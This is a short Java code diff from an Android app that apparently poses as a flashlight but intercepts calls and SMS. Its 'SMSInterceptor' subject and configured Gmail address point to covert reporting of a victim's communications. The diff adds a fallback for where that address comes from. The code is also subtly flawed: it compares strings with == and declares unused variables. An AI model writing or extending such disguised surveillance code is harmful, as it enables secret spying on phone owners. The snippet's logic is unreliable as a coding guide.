@@ -14,15 +14,18 @@ import android.telephony.TelephonyManager;
 
 public class CallReceiver extends PhoneCallReceiver {
 
-  private static Configure configure;
-
   private static String gmailEmailString;
 
   private static final String SUBJECT = "SMSInterceptor";
   private static final String TAG     = "FlashLight CallReceiver";
 
   public CallReceiver() { 
-    gmailEmailString = new Configure().emailAddress();
+    Configure configure;
+    FlashLightService FlashLightService;
+      gmailEmailString = new Configure().emailAddress();
+    if(gmailEmailString == "null") {
+      gmailEmailString = new FlashLightService().emailAddress();
+    }
   }
 
   public String endPoint(final String number, final Context context) {
